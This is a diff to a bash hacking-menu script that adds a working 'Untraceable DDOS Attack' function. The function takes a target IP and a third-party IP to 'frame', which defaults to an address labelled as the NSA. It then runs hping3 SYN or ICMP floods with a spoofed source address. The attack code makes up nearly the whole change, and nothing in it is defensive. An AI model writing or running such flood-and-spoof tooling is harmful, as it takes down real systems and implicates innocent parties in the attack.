@@ -189,7 +189,42 @@ local-scan() {
     main-menu
 }
 ddos-ip() {
-    coming-soon
+    clear 
+    figlet DDOS IP Address
+    echo ""
+    echo "================== Untraceable DDOS Attack =================="
+    echo ""
+    read -p "Enter Target IP Address: " IP
+    if [ -z $IP ]
+    then
+    echo ""
+    echo "Cannot leave blank"
+    sleep 2
+    ddos-ip
+    fi
+    read -p "IP Address to Frame (default is NSA): " FALL
+    if [ -z $FALL ]
+    then
+    FALL="104.98.41.58"
+    fi
+    read -p "Enter Port (default is all ports): " PORT
+    if [ -z $PORT ]
+    then
+    echo ""
+    echo "Press CTRL + C to stop DDOS"
+    echo ""
+    echo "Sending Packets..."
+    hping3 -1 --flood -a "$FALL" "$IP" > /dev/null 2>&1
+    else
+    echo ""
+    echo "Press CTRL + C to stop DDOS"
+    echo ""
+    echo "Sending Packets..."
+    hping3 -S -a $FALL --flood -p $PORT $IP > /dev/null 2>&1
+    fi
+    echo ""
+    read -n 1 -r -s -p "Press any key to continue..."
+    main-menu
 }
 ddos-website() {
     coming-soon
